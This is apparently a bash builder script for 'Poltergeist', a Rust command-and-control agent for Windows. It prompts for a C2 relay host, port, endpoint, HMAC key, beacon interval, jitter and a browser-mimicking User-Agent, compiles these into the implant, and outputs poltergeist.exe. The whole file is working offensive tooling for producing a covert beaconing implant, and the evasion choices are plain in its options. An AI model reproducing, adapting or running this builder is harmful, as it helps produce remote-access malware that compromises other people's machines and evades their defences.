#!/bin/bash

echo "=========================================="
echo "  Poltergeist Agent Builder (Rust)"
echo "=========================================="
echo ""

# Prompt for configuration
read -p "C2 Relay Host [localhost]: " C2_HOST
C2_HOST=${C2_HOST:-localhost}

read -p "C2 Relay Port [8081]: " C2_PORT
C2_PORT=${C2_PORT:-8081}

read -p "C2 Endpoint [/wiki]: " C2_ENDPOINT
C2_ENDPOINT=${C2_ENDPOINT:-/wiki}

read -p "HMAC Key (hex): " HMAC_KEY

if [ -z "$HMAC_KEY" ]; then
    echo "[ERROR] HMAC key is required!"
    exit 1
fi

read -p "Beacon Interval (seconds) [15]: " BEACON_INTERVAL
BEACON_INTERVAL=${BEACON_INTERVAL:-15}

read -p "Jitter (seconds) [10]: " JITTER
JITTER=${JITTER:-10}

read -p "User Agent [Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36]: " USER_AGENT
USER_AGENT=${USER_AGENT:-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

echo ""
echo "Configuration:"
echo "  Host:            $C2_HOST"
echo "  Port:            $C2_PORT (QUIC/HTTP3)"
echo "  Endpoint:        $C2_ENDPOINT"
echo "  HMAC Key:        ${HMAC_KEY:0:16}...${HMAC_KEY: -8}"
echo "  Beacon Interval: ${BEACON_INTERVAL}s"
echo "  Jitter:          ${JITTER}s"
echo ""

# Write configuration to a temp build config
cat > build_config.env << EOF
LISTENER_HOST=$C2_HOST
LISTENER_PORT=$C2_PORT
LISTENER_ENDPOINT=$C2_ENDPOINT
HMAC_KEY_HEX=$HMAC_KEY
RECONNECT_INTERVAL=$BEACON_INTERVAL
JITTER_SECONDS=$JITTER
USER_AGENT=$USER_AGENT
EOF

echo "[*] Building with cargo (release + optimizations)..."
echo ""

# Export environment variables for compile-time substitution
export POLTERGEIST_HOST="$C2_HOST"
export POLTERGEIST_PORT="$C2_PORT"
export POLTERGEIST_ENDPOINT="$C2_ENDPOINT"
export POLTERGEIST_HMAC_KEY="$HMAC_KEY"
export POLTERGEIST_INTERVAL="$BEACON_INTERVAL"
export POLTERGEIST_JITTER="$JITTER"
export POLTERGEIST_USER_AGENT="$USER_AGENT"

# Build with cargo in release mode
cargo build --release --target x86_64-pc-windows-msvc

if [ $? -eq 0 ]; then
    echo ""
    echo "[SUCCESS] Build complete: target/x86_64-pc-windows-msvc/release/poltergeist.exe"
    echo ""
    ls -lh target/x86_64-pc-windows-msvc/release/poltergeist.exe
else
    echo ""
    echo "[ERROR] Build failed!"
    exit 1
fi
